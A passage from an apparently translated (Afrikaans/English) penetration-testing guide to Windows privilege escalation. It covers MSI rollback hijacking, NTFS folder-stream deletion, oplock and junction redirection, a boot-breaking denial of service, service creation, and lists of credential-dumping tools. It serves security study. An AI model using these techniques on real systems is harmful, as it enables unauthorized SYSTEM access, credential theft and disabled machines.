8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Van Administrator Medium na High Integriteitsvlak / UAC Bypass

Lees dit om te leer oor Integriteitsvlakke:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan dit om te leer oor UAC en UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Arbitrary Folder Delete/Move/Rename na SYSTEM EoP

Die tegniek beskryf [**in hierdie blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) met 'n exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van die Windows Installer se rollback-funksie om wettige lêers met kwaadwillige een te vervang tydens die uninstall-proses. Hiervoor moet die aanvaller 'n **kwaadwillige MSI installer** skep wat gebruik sal word om die `C:\Config.Msi` gids te kap, wat later deur die Windows Installer gebruik sal word om rollback-lêers te stoor tydens die uninstall van ander MSI-pakkette waar die rollback-lêers verander sou wees om die kwaadwillige payload te bevat.

Die saamgevatte tegniek is soos volg:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Skep 'n `.msi` wat 'n onskadelike lêer installeer (bv. `dummy.txt`) in 'n skryfbare gids (`TARGETDIR`).
- Merk die installer as **"UAC Compliant"**, sodat 'n **non-admin user** dit kan uitvoer.
- Hou 'n **handle** oop na die lêer ná installasie.

- Step 2: Begin Uninstall
- Uninstall dieselfde `.msi`.
- Die uninstall-proses begin lêers na `C:\Config.Msi` skuif en hernoem hulle na `.rbf` lêers (rollback backups).
- **Poll the open file handle** met `GetFinalPathNameByHandle` om te detecteer wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Step 3: Custom Syncing
- Die `.msi` sluit 'n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- Signaleer wanneer die `.rbf` geskryf is.
- Dan **wag** op 'n ander event voordat die uninstall voortgaan.

- Step 4: Block Deletion of `.rbf`
- Wanneer gesignaleer, **open die `.rbf` file** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit gedelete word**.
- Dan **signaleer terug** sodat die uninstall kan voltooi.
- Windows Installer kan nie die `.rbf` delete nie, en omdat dit nie al die inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Step 5: Manually Delete `.rbf`
- Jy (aanvaller) delete die `.rbf` lêer manueel.
- Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Herstel self die `C:\Config.Msi` gids.
- Stel **weak DACLs** (bv. Everyone:F), en **hou 'n handle oop** met `WRITE_DAC`.

- Step 7: Run Another Install
- Installeer die `.msi` weer, met:
- `TARGETDIR`: skryfbare ligging.
- `ERROROUT`: 'n veranderlike wat 'n geforseerde fout veroorsaak.
- Hierdie install sal gebruik word om **rollback** weer te trigger, wat `.rbs` en `.rbf` lees.

- Step 8: Monitor for `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat 'n nuwe `.rbs` verskyn.
- Neem die lêernaam vas.

- Step 9: Sync Before Rollback
- Die `.msi` bevat 'n **custom install action (`SyncBeforeRollback`)** wat:
- Signaleer 'n event wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Step 10: Reapply Weak ACL
- Nadat jy die `.rbs created` event ontvang:
- Die Windows Installer **herpas 'n strong ACL** op `C:\Config.Msi`.
- Maar aangesien jy steeds 'n handle met `WRITE_DAC` het, kan jy weer **weak ACLs** toepas.

> ACLs is **slegs afgedwing by handle open**, so jy kan steeds na die gids skryf.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Oorskryf die `.rbs` lêer met 'n **fake rollback script** wat Windows instruer om:
- Jou `.rbf` lêer (kwaadwillige DLL) te herstel na 'n **bevoorregte ligging** (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou fake `.rbf` neer te sit wat 'n **kwaadwillige SYSTEM-level payload DLL** bevat.

- Step 12: Trigger the Rollback
- Signaleer die sync event sodat die installer hervat.
- 'n **type 19 custom action (`ErrorOut`)** is geconfigureer om die install doelbewus by 'n bekende punt te laat misluk.
- Dit veroorsaak dat **rollback begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lees jou kwaadwillige `.rbs`.
- Kopieer jou `.rbf` DLL in die teikenligging.
- Jy het nou jou **kwaadwillige DLL in 'n SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Voer 'n trusted **auto-elevated binary** uit (bv. `osk.exe`) wat die DLL wat jy gekaap het laad.
- **Boom**: Jou kode word uitgevoer **as SYSTEM**.


### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof MSI rollback-tegniek (hierbo) veronderstel jy kan 'n **he­le gids** delete (bv. `C:\Config.Msi`). Maar wat as jou kwetsbaarheid slegs **arbitrary file deletion** toelaat?

Jy kan NTFS internals misbruik: elke gids het 'n versteekte alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeks metagegewens** van die gids.

As jy dus die **`::$INDEX_ALLOCATION` stroom verwyder** van 'n gids, verwyder NTFS **die hele gids** van die lêerstelsel.

Jy kan dit doen met standaard lêerverwyderings-APIs soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API aanroep, dit **verwyder die gids self**.

### From Folder Contents Delete to SYSTEM EoP
Wat as jou primitive jou nie toelaat om willekeurige lêers/gidse te verwyder nie, maar dit **does allow deletion of the *contents* of an attacker-controlled folder**?

1. Stap 1: Stel 'n lokaas-gids en -lêer op
- Skep: `C:\temp\folder1`
- Daarbinne: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pauzeer uitvoering** wanneer 'n geprivilegieerde proses probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Aktiveer SYSTEM-proses (bv., `SilentCleanup`)
- Hierdie proses deursoek gidse (bv., `%TEMP%`) en probeer hul inhoud verwyder.
- Wanneer dit by `file1.txt` uitkom, die **oplock triggers** en oorhandig beheer aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` na elders
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moet nie `file1.txt` direk verwyder nie — dit sou die oplock voortydig vrygee.

- Opsie B: Skakel `folder1` om na 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit mik op die NTFS interne stroom wat vouermetadata stoor — deur dit te verwyder, verwyder dit die vouer.

5. Stap 5: Vrylaat die oplock
- SYSTEM-proses gaan voort en probeer `file1.txt` uitvee.
- Maar nou, danksy die junction + symlink, verwyder dit eintlik:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanente DoS

Eksploiteer 'n primitive wat jou toelaat om **create an arbitrary folder as SYSTEM/admin** — selfs as **you can’t write files** of **set weak permissions**.

Skep 'n **folder** (nie 'n **file** nie) met die naam van 'n **critical Windows driver**, bv.:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad ooreenstem gewoonlik met die `cng.sys` kernel-mode drywer.
- As jy dit **vooraf as 'n vouer' skep**, slaag Windows nie daarin om die werklike drywer tydens opstart te laai nie.
- Daarna probeer Windows tydens opstart om `cng.sys` te laai.
- Dit sien die vouer, **slaag nie daarin om die werklike drywer te vind nie**, en **verstort of staak die opstartproses**.
- Daar is **geen fallback** nie, en **geen herstel** sonder eksterne ingryping nie (bv. opstartherstel of skyftoegang).


## **Van High Integrity na System**

### **Nuwe diens**

As jy reeds op 'n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees deur net **'n nuwe diens te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service-binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig genoeg uitvoer, aangesien dit in 20s gedood sal word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanuit 'n High Integrity-proses kan jy probeer om die AlwaysInstallElevated registry entries te aktiveer en 'n reverse shell te installeer met 'n _**.msi**_-wrapper.\
[Meer inligting oor die betrokke registry keys en hoe om 'n _.msi_ pakket te installeer hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**vind die kode hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token-privileges het (waarskynlik sal jy dit in 'n reeds bestaande High Integrity-proses vind), sal jy byna enige proses (nie-protected processes) met die SeDebug privilege kan oopmaak, die token van die proses kan **kopieer**, en 'n **arbitrêre proses met daardie token** kan skep.\
Hierdie tegniek kies gewoonlik **'n proses wat as SYSTEM loop met al die token-privileges** (_ja, jy kan SYSTEM-prosesse vind sonder al die token-privileges_).\
**Jy kan 'n** [**voorbeeld van kode wat die voorgestelde tegniek uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### Named Pipes

Hierdie tegniek word deur meterpreter gebruik om te eskaleer in `getsystem`. Die tegniek bestaan uit die **skep van 'n pipe en dan 'n service skep/misbruik om op daardie pipe te skryf**. Daarna sal die **server** wat die pipe geskep het met die **`SeImpersonate`** privilege in staat wees om die token van die pipe-klient (die service) te **impersonate** en sodoende SYSTEM-privileges te verkry.\
As jy meer oor name pipes wil [**leer moet jy dit lees**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil sien van [**hoe om van high integrity na System te gaan met name pipes moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll wat deur 'n proses wat as **SYSTEM** loop te **hijack**, sal jy arbitrêre kode met daardie permissies kan uitvoer. Dll Hijacking is dus ook nuttig vir hierdie soort privilege escalation, en dit is baie **makkelijker om vanaf 'n high integrity-proses te bereik** aangesien dit **skryfpermissies** op die vouers het wat gebruik word om dll's te laad.\
**Jy kan** [**meer oor Dll hijacking hier leer**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste hulpmiddel om Windows local privilege escalation-vektore te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir misconfigurasies en sensitiewe lêers (**[**check hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir sekere moontlike misconfigurasies en versamel inligting (**[**check hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir misconfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP gestoor sessie-inligting. Gebruik -Thorough lokaal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek kredensiale uit Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-the-middle hulpmiddel.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows-opsomming**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek bekende privesc kwesbaarhede (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale kontroles **(Benodigd Admin regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek bekende privesc kwesbaarhede (moet saamgestel word met VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerate die host en soek na misconfigurasies (meer 'n info-versamelingshulpmiddel as privesc) (moet saamgestel word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek kredensiale uit baie sagteware (precompiled exe op github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Poort van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Kontroleer vir misconfigurasies (uitvoerbare precompiled op github). Nie aanbeveel nie. Werk nie goed op Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike misconfigurasies (exe vanaf python). Nie aanbeveel nie. Werk nie goed op Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Hulpmiddel geskep gebaseer op hierdie pos (dit benodig nie accesschk om behoorlik te werk nie maar kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([sien dit](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-host te sien, kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
